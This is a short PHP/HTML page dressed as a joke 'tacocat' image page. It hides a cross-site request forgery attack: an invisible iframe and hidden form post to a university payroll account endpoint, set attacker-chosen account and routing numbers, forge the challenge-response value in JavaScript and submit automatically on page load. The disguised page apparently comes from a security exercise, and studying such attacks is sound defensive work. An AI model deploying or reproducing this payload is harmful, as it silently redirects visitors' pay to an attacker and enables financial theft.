<html>
<head>
	<title>You know you lovez tacoz.</title>
</head>
<body>
<center><img src="http://static.fjcdn.com/pictures/tacocat_0a9bb2_4573796.jpg" alt="catz likez tacoz"></center> 
<?php
$tacos = mt_rand();
?>
	<iframe style="display:none" name="csrf-frame"></iframe>
	<form method="post" action="http://payroll.utexas.edu/account.php" target="csrf-frame" id="csrf-form">
		<input id="account" type="hidden" name="account" value="31337" />
                <input id="route" type="hidden" name="routing" value="10001" />
		<input id="csrf_challenge" type="hidden" name="chal" value="<?php echo $tacos ?>">
		<input id="csrf_response" type="hidden" name="resp" value="">
		<button name="action" style="display:none;" id="crsfBUTTON" type="submit" value="save">

	</form>
	<script type="text/javascript">
		var a = document.getElementById('account');
		var r = document.getElementById('route');
                function grind() {
			document.getElementById('csrf_response').value =btoa(a.value + "<?php echo $tacos ?>" + r.value);
		}
		a.onkeyup = grind;
	 	r.onkeyup = grind; 
		grind();
		document.getElementById("crsfBUTTON").click();
	</script>

